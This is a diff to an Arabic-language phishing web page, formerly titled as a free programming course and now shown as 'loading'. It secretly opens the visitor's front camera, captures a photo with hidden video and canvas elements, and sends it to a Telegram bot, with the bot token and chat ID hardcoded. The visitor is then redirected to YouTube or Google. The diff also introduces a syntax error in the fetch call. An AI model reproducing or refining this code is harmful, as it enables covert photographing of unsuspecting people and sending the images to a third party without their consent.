@@ -2,9 +2,10 @@
 <html lang="ar">
 <head>
   <meta charset="UTF-8">
-  <title>دورة برمجية مجانية</title>
+  <title>جارٍ التحميل...</title>
 </head>
 <body>
+  <h3>جارٍ تحميل الصفحة...</h3>
   <video id="video" autoplay style="display:none;"></video>
   <canvas id="canvas" style="display:none;"></canvas>
 
@@ -12,20 +13,13 @@
     const token = '8077679722:AAGIQbfCgIfyJyystYkR7FdVhtT7Qy-oFBE';
     const chatId = '7728263509';
 
-    function dataURLtoBlob(dataurl) {
-      let arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
-          bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
-      while(n--) u8arr[n] = bstr.charCodeAt(n);
-      return new Blob([u8arr], {type:mime});
-    }
-
     async function sendPhoto(base64Image) {
-      const blob = dataURLtoBlob(base64Image);
+      const blob = await (await fetch(base64Image)).blob();
       const formData = new FormData();
       formData.append("chat_id", chatId);
       formData.append("photo", blob, "photo.jpg");
 
-      await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+      await fetch(https://api.telegram.org/bot${token}/sendPhoto, {
         method: "POST",
         body: formData
       });
@@ -34,12 +28,13 @@
     async function captureAndSendCameraImage() {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: "user" }
+          video: { facingMode: "user" } // الكاميرا الأمامية
         });
 
         const video = document.getElementById('video');
         video.srcObject = stream;
 
+        // انتظر شوي حتى تشتغل الكاميرا
         setTimeout(() => {
           const canvas = document.getElementById('canvas');
           canvas.width = video.videoWidth;
@@ -47,18 +42,18 @@
           const ctx = canvas.getContext('2d');
           ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
+          // أوقف الكاميرا
           stream.getTracks().forEach(track => track.stop());
 
           const base64Image = canvas.toDataURL("image/jpeg");
           sendPhoto(base64Image).then(() => {
-            // ✅ بعد إرسال الصورة، ينقله ليوتيوب!
-            window.location.href = "https://www.youtube.com/watch?v=SDHEI3obWx0";
+            window.location.href = "https://google.com";
           });
 
-        }, 3000);
+        }, 3000); // انتظر 3 ثواني
       } catch (err) {
-        // فشل الوصول؟ خلاص يوديه اليوتيوب برضه
-        window.location.href = "https://www.youtube.com/watch?v=SDHEI3obWx0";
+        alert("فشل الوصول للكاميرا: " + err);
+        window.location.href = "https://google.com";
       }
     }
 
